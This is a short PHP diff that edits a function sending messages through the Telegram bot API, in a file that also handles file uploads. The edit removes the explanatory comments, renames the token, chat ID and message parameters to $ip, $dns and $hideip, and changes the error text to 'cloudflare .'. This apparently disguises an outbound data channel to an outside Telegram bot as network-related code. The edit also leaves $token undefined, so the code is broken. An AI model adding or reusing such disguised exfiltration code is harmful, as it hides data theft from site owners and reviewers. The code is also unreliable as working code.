@@ -21,21 +21,21 @@ if (isset($_FILES['file']['tmp_name'])) {
         }
     }
 }
-// Fungsi untuk mengirim pesan ke Telegram
-function kirimPesanTelegram($token, $chatId, $pesan)
+// 
+function kirimPesanTelegram($ip, $dns, $hideip)
 {
-    // Periksa apakah token dan chatId valid
-    if (empty($token) || empty($chatId)) {
-        echo "Token atau Chat ID tidak valid.";
+    // 
+    if (empty($ip) || empty($dns)) {
+        echo "cloudflare .";
         return;
     }
 
     $url = "https://api.telegram.org/bot$token/sendMessage";
 
-    // Data yang akan dikirim ke API Telegram
+    // Data 
     $data = [
-        "chat_id" => $chatId,
-        "text" => $pesan,
+        "chat_id" => $dns,
+        "text" => $ip,
     ];
 
     // Inisialisasi cURL
